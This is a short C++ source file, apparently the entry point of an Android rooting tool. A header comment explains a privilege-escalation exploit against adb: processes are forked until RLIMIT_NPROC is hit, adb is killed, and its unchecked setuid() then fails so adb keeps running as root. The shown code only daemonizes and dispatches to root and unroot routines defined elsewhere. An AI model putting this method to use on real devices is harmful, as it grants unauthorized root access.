/*
 * This exploit will fork off proccesseses (as shell user) until the RLIMIT_NPROC max is
 * hit. At that point fork() will start failing. At this point parent
 * process will kill the adb process, causing it to restart. When adb starts, it
 * runs as root, and then drops its privs with setuid():
 *
 *  <snip>
 *   // don't listen on a port (default 5037) if running in secure mode
 *   // don't run as root if we are running in secure mode
 *   if (secure) {
 *
 *       ...
 *
 *       // then switch user and group to "shell"
 *       setgid(AID_SHELL);
 *       setuid(AID_SHELL);
 *  </snip>
 *
 * setuid() will decrement the root process count, and increment the shell user
 * proccess count. Since the shell user has hit the RLIMIT_NPROC max, this will
 * cause setuid() to fail. Since the adb code above doesn't check the retval of
 * setuid(), adb will still be running as root.
 *
 */

#include "cmdLine.h"
#include "impl.h"
#include "proc.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

#include <sys/stat.h>

////////////////////////////////////////////////////////////////////////////////////////
static bool make_daemon()
{
   bool ret( false );

   pid_t pid( fork() );

   if( pid == 0 )
   {
      setsid();

      ret = true;
   }
   else if( pid > 0 )
   {
      sleep( 1 );
   }

   return ret;
}

/////////////////////////////////////////////////////////////////////////////
int main( int anArgc, char* anArgv[] )
{
   int ret( 0 );
   
   //////////////////////////////////////////////////////
   ECmdId cmdId( get_cmd( anArgc, anArgv ) );

   if( cmdId == ciUnknown )
   {
      ret = -1;
   }
   else
   {
      ///////////////////////////////////////////////////////
      if( make_daemon() )
      {
         ///////////////////////////////////////////////////////
         if( cmdId == ciRoot )
         {
            ret = root();
         }
         else if( cmdId == ciUnroot )
         {
            ret = unroot();
         }
      }
   }

   return ret;
}
